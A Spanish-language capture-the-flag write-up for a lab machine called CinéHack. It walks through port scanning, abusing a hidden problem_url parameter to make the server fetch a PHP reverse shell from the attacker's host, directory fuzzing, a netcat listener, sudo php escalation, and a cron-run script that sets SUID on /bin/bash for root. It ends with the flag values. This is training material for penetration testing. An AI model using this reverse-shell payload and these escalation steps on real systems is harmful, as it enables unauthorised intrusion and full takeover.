---
icon: flag
---

# CTF CineHack Intermediate

URL Download CTF = [https://drive.google.com/file/d/1G05W6zX8FRWNp7RSxnatz1goZTaZ-pi7/view?usp=sharing](https://drive.google.com/file/d/1G05W6zX8FRWNp7RSxnatz1goZTaZ-pi7/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip cinehack.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh cinehack.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 06:08 EST
Nmap scan report for 172.17.0.3
Host is up (0.000044s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Bienvenido a Cinema DL
MAC Address: 02:42:AC:11:00:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

Vemos que solo hay un puerto `80` y si bajamos un poco vemos lo que parece ser un dominio dentro de la pagina que podria corresponderse con un dominio que este sujeto a la pagina, por lo que harems lo siguiente:

```shell
nano /etc/hosts

#Dentro del nano
<IP>        cinema.dl
```

Lo guardamos y ahora entramos con dicho dominio:

```
URL = http://cinema.dl/
```

Vemos que nos carga una pagina como si fuera una cartelera de cine y la unica pelicula a la que podemos entrar es a la llamada `El tiempo que tenemos`, dentro del mismo podremos ver que podemos como reservar entradas, las cuales si le damos a reservar nos lleva a un `reservation.php`, vamos a ver que hace de forma intenta con la peticion de reserva capturandolo con `BurpSuite`.

<figure><img src="../../.gitbook/assets/image (164) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que hay un parametro oculto llamado `problem_url=` el cual indica como una `URL` por defecto como si pudieramos hacer algo desde un servidor externo, por lo que vamos a probar a abrir un servidor de `python3` con una `shell.php` que vamos a crear y añadirlo en ese parametro a ver que pasa.

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Abriremos un servidor de `python3`:

```shell
python3 -m http.server
```

Y ahora en la pagina iremos a la siguiente `URL` ya que sabemos que parametro usar.

```
URL = http://cinema.dl/reservation.php?problem_url=http://<IP>:8000/shell.php
```

Si nos vamos a donde tenemos el servidor de `python3` veremos que nos ha cogido el archivo:

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.3 - - [16/Jan/2025 06:18:16] "GET /shell.php HTTP/1.1" 200 -
```

Pero no tenemos ninguna carpeta de `uploads/` ni nada parecido, por lo que vamos a probar hacer un `fuzzing` con un diccionario personalizado sobre el nombre y apellidos de los actores de la pelicula `El tiempo que tenemos` quedando de la siguiente forma:

## Gobuster

> dic.txt

```
andrewgarfield
florencepugh
gracedelaney
leebraithwaite
aoifehinds
adamjames
douglashodge
maramacorlett
heathercraney
niamhcusack
robertboulter
kerrygodliman
```

Y haremos lo siguiente:

```shell
gobuster dir -u http://cinema.dl/ -w dic.txt -x html,php,txt -t 100 -k
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cinema.dl/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                dic.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/andrewgarfield       (Status: 301) [Size: 315] [--> http://cinema.dl/andrewgarfield/]
Progress: 48 / 52 (92.31%)
===============================================================
Finished
===============================================================
```

Vemos que nos encuentra uno llamado `/andrewgarfield` y si entramos en el:

```
URL = http://cinema.dl/andrewgarfield/
```

<figure><img src="../../.gitbook/assets/image (163) (1).png" alt=""><figcaption></figcaption></figure>

Veremos que es donde esta subido el archivo que se descargo el `problem_url=` por lo que nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y pulsamos en el `shell.php`, si volvemos a la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.3] 54126
whoami
www-data
```

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user boss

Antes de nada si vamos al `/opt` vemos el siguiente `script`:

```shell
cat /opt/update.sh
```

Info:

```bash
#!/bin/bash

# Comprobar si el usuario 'boss' tiene algún proceso en ejecución
# También buscar procesos asociados a "script" o shells indirectas
if pgrep -u boss > /dev/null; then
    # Mostrar procesos activos del usuario boss para depuración (opcional)
    echo "Procesos activos del usuario boss:"
    ps -u boss

    # Matar todos los procesos del usuario 'boss' incluyendo 'script'
    pkill -u boss
    pkill -9 -f "script"

    # Confirmar que los procesos fueron terminados
    if pgrep -u boss > /dev/null; then
        echo "No se pudieron terminar todos los procesos del usuario boss."
    else
        echo "El usuario boss ha sido desconectado por seguridad."
    fi
else
    echo "El usuario boss no está conectado."
fi
```

Por lo que vemos cuando nos conectemos con el usuario `boss` puede ser que haya algo que ejecute este script y nos eche de la sesion, por lo que podemos intuir que puede haber algun `crontab`.

Si nos vamos a `/var/spool/cron` y listamos veremos lo siguiente:

```
dr-xrwx--T 1 boss crontab 4096 Jan 16 11:58 crontabs
```

Vemos que el usuario `boss` puede acceder a este directorio y dentro puede haber algo que nos interese.

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on dockerlabs:
    (boss) NOPASSWD: /bin/php
```

Vemos que podemos ejecutar el binario `php` como el usuario `boss` por lo que haremos lo siguiente:

```shell
CMD="/bin/bash"
sudo -u boss php -r "system('$CMD');"
```

Y con esto seremos el usuario `boss`, por lo que leeremos la flag del usuario.

> user.txt

```
93a85c1e99d62afe15c179d4fd005f40
```

## Escalate Privileges

Si nos vamos donde dijimos antes, veremos que nos deja meternos en el directorio, cosa que es poco usual:

```shell
cd /var/spool/cron/crontabs
```

Si listamos veremos lo siguiente:

```
-rwxr-xr-x 1 root crontab 1197 Jan 16 11:58 root.sh
```

Vemos que podemos leer el archivo `root`:

```
#!/bin/bash

# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.JicO9c/crontab installed on Thu Jan 16 11:58:58 2025)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command

#*/1 * * * * chmod +r /var/spool/cron/crontabs/root
/opt/update.sh
/tmp/script.sh
```

Vemos que `root.sh` es un script y no un `crontab` por lo que vamos a ver que se esta ejecutando a nivel de sistema:

```shell
ps aux
```

Info:

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2800  1792 ?        Ss   13:10   0:00 /bin/sh -c service apache2 start && service cron start && while true; do /var/spool/cron/c
root          24  0.0  0.2 203476 21832 ?        Ss   13:10   0:00 /usr/sbin/apache2 -k start
www-data      29  0.0  0.1 203720 15780 ?        S    13:10   0:00 /usr/sbin/apache2 -k start
www-data      30  0.0  0.1 203548 14756 ?        S    13:10   0:00 /usr/sbin/apache2 -k start
www-data      31  0.0  0.1 203508  9636 ?        S    13:10   0:00 /usr/sbin/apache2 -k start
www-data      32  0.0  0.1 203508  9636 ?        S    13:10   0:00 /usr/sbin/apache2 -k start
www-data      33  0.0  0.1 203508  9636 ?        S    13:10   0:00 /usr/sbin/apache2 -k start
root          41  0.0  0.0   3808  1796 ?        Ss   13:10   0:00 /usr/sbin/cron -P
www-data      47  0.0  0.1 203508  9636 ?        S    13:10   0:00 /usr/sbin/apache2 -k start
www-data      48  0.0  0.0   2800  1792 ?        S    13:11   0:00 sh -c sh
www-data      49  0.0  0.0   2800  1792 ?        S    13:11   0:00 sh
www-data      51  0.0  0.0   2716  1792 ?        S    13:11   0:00 script /dev/null -c bash
www-data      52  0.0  0.0   2800  1664 pts/0    Ss   13:11   0:00 sh -c bash
www-data      53  0.0  0.0   4588  3584 pts/0    S    13:11   0:00 bash
root          72  0.0  0.0   2696  1536 ?        S    13:12   0:00 sleep 60
www-data      76  0.0  0.0   7888  3968 pts/0    R+   13:12   0:00 ps -aux
```

Por lo que vemos esta ejecutando el `root.sh` cada minuto, pero como bien hemos visto tambien esta ejecutando a la vez el `/tmp/script.sh` por lo que podremos salir con `exit` del usuario y crearlo con `www-data` para que no nos expulse.

```shell
nano /tmp/script.sh

#Dentro del nano
#!/bin/bash

chmod u+s /bin/bash
```

Guardamos esto y le ponemos permisos de ejecuccion:

```shell
chmod +x /tmp/script.sh
```

Y ahora tendremos que esperar `1` minuto a que se ejecute, una vez que se haya ejecutado el crontab, si listamos la `bash`:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Veremos que ha funcionado y ahora la `bash` tiene permisos de `SUID`, por lo que haremos lo siguiente:

```shell
bash -p
```

Y con esto seremos `root` por lo que leeremos la flag de `root`:

> root.txt

```
687f891cbfd513ac53641755ce0efe5e
```
